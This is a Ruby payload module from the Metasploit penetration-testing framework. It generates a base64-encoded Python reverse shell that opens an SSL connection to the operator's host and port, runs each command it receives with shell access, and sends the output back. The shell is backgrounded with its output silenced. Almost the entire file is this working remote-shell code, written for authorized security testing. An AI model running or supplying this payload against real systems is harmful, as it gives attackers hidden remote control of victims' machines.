##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'msf/core/handler/reverse_tcp_ssl'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module Metasploit3
  extend  Metasploit::Framework::Module::Ancestor::Handler
  extend  Metasploit::Framework::Module::Ancestor::Handler

  include Msf::Payload::Single
  include Msf::Sessions::CommandShellOptions

  handler module_name: 'Msf::Handler::ReverseTcpSsl'

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Unix Command Shell, Reverse TCP SSL (via python)',
      'Description'   => 'Creates an interactive shell via python, uses SSL, encodes with base64 by design.',
      'Author'        => 'RageLtMan',
      'License'       => BSD_LICENSE,
      'Platform'      => 'unix',
      'Arch'          => ARCH_CMD,
      'Session'       => Msf::Sessions::CommandShell,
      'PayloadType'   => 'cmd',
      'RequiredCmd'   => 'python',
      'Payload'       =>
        {
          'Offsets' => { },
          'Payload' => ''
        }
      ))
  end

  #
  # Constructs the payload
  #
  def generate
    vprint_good(command_string)
    return super + command_string
  end

  #
  # Returns the command string to use for execution
  #
  def command_string
    cmd = ''
    dead = Rex::Text.rand_text_alpha(2)
    # Set up the socket
    cmd += "import socket,subprocess,os,ssl\n"
    cmd += "so=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n"
    cmd += "so.connect(('#{ datastore['LHOST'] }',#{ datastore['LPORT'] }))\n"
    cmd += "s=ssl.wrap_socket(so)\n"
    # The actual IO
    cmd += "#{dead}=False\n"
    cmd += "while not #{dead}:\n"
    cmd += "\tdata=s.recv(1024)\n"
    cmd += "\tif len(data)==0:\n\t\t#{dead} = True\n"
    cmd += "\tproc=subprocess.Popen(data,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)\n"
    cmd += "\tstdout_value=proc.stdout.read() + proc.stderr.read()\n"
    cmd += "\ts.send(stdout_value)\n"

    # The *nix shell wrapper to keep things clean
    # Base64 encoding is required in order to handle Python's formatting requirements in the while loop
    cmd = "python -c \"exec('#{Rex::Text.encode_base64(cmd)}'.decode('base64'))\""
    cmd += ' >/dev/null 2>&1 &'
    return cmd

  end

end
